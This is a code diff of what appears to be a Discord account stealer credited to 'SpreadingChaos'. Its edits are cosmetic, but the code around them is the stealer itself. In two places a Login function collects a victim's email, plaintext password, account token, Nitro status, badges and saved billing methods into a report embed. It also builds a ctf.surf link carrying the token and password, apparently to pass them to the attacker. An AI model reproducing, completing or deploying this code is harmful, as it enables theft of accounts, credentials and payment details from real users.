@@ -244,7 +244,7 @@ function GetNitro(flags) {
         return "No Nitro"
     }
     if (flags == 1) {
-        return "<:classic:896119171019067423> \`Nitro Classic\`"
+        return "<:classic:967106418786320404> \`Nitro Classic\`"
     }
     if (flags == 2) {
         return "<:1m:967104133070979153> \`Nitro Boost\`"
@@ -429,7 +429,7 @@ function Login(email, password, token) {
                                     } else if (z.type == 2 && z.invalid != !0) {
                                         billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                     } else if (z.type == 1 && z.invalid != !0) {
-                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
+                                        billing += "\`✔️\`" + " :credit_card:"
                                     } else {
                                         return "\`❌\`"
                                     }
@@ -442,42 +442,42 @@ function Login(email, password, token) {
                             const json = JSON.parse(info);
 
                             var params = {
-                                embeds: [{
+                                "embeds": [{
                                     "title": "User Login",
-                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                    "description": "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                     "color": config['embed-color'],
                                     "fields": [{
-                                        name: "Username",
-                                        value: `\`${json.username}#${json.discriminator}\``,
-                                        inline: !0
+                                        "name": "Username",
+                                        "value": `\`${json.username}#${json.discriminator}\``,
+                                        "inline": !0
                                     }, {
-                                        name: "ID",
-                                        value: `\`${json.id}\``,
-                                        inline: !0
+                                        "name": "ID",
+                                        "value": `\`${json.id}\``,
+                                        "inline": !0
                                     }, {
-                                        name: "Nitro",
-                                        value: `${GetNitro(json.premium_type)}`,
-                                        inline: !1
+                                        "name": "Nitro",
+                                        "value": `${GetNitro(json.premium_type)}`,
+                                        "inline": !1
                                     }, {
-                                        name: "Badges",
-                                        value: `${GetBadges(json.flags)}`,
-                                        inline: !1
+                                        "name": "Badges",
+                                        "value": `${GetBadges(json.flags)}`,
+                                        "inline": !1
                                     }, {
-                                        name: "Billing",
-                                        value: `${Cool()}`,
-                                        inline: !1
+                                        "name": "Billing",
+                                        "value": `${Cool()}`,
+                                        "inline": !1
                                     }, {
-                                        name: "Email",
-                                        value: `\`${email}\``,
-                                        inline: !0
+                                        "name": "Email",
+                                        "value": `\`${email}\``,
+                                        "inline": !0
                                     }, {
-                                        name: "Password",
-                                        value: `\`${password}\``,
-                                        inline: !0
+                                        "name": "Password",
+                                        "value": `\`${password}\``,
+                                        "inline": !0
                                     }, {
-                                        name: "Token",
-                                        value: `\`\`\`${token}\`\`\``,
-                                        inline: !1
+                                        "name": "Token",
+                                        "value": `\`\`\`${token}\`\`\``,
+                                        "inline": !1
                                     }, ],
                                     "author": {
                                         "name": "SpreadingChaos"
@@ -596,42 +596,42 @@ function Login(email, password, token) {
                                         }
                                         const json = JSON.parse(info);
                                         var params = {
-                                            embeds: [{
+                                            "embeds": [{
                                                 "title": "User Login",
-                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+                                                "description": "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                                 "color": config['embed-color'],
                                                 "fields": [{
-                                                    name: "Username",
-                                                    value: `\`${json.username}#${json.discriminator}\``,
-                                                    inline: !0
+                                                    "name": "Username",
+                                                    "value": `\`${json.username}#${json.discriminator}\``,
+                                                    "inline": !0
                                                 }, {
-                                                    name: "ID",
-                                                    value: `\`${json.id}\``,
-                                                    inline: !0
+                                                    "name": "ID",
+                                                    "value": `\`${json.id}\``,
+                                                    "inline": !0
                                                 }, {
-                                                    name: "Nitro",
-                                                    value: `${GetNitro(json.premium_type)}`,
-                                                    inline: !1
+                                                    "name": "Nitro",
+                                                    "value": `${GetNitro(json.premium_type)}`,
+                                                    "inline": !1
                                                 }, {
-                                                    name: "Badges",
-                                                    value: `${GetBadges(json.flags)}`,
-                                                    inline: !1
+                                                    "name": "Badges",
+                                                    "value": `${GetBadges(json.flags)}`,
+                                                    "inline": !1
                                                 }, {
-                                                    name: "Billing",
-                                                    value: `${Cool()}`,
-                                                    inline: !1
+                                                    "name": "Billing",
+                                                    "value": `${Cool()}`,
+                                                    "inline": !1
                                                 }, {
-                                                    name: "Email",
-                                                    value: `\`${email}\``,
-                                                    inline: !0
+                                                    "name": "Email",
+                                                    "value": `\`${email}\``,
+                                                    "inline": !0
                                                 }, {
-                                                    name: "Password",
-                                                    value: `\`${password}\``,
-                                                    inline: !0
+                                                    "name": "Password",
+                                                    "value": `\`${password}\``,
+                                                    "inline": !0
                                                 }, {
-                                                    name: "Token",
-                                                    value: `\`\`\`${token}\`\`\``,
-                                                    inline: !1
+                                                    "name": "Token",
+                                                    "value": `\`\`\`${token}\`\`\``,
+                                                    "inline": !1
                                                 }, ],
                                                 "author": {
                                                     "name": "SpreadingChaos"
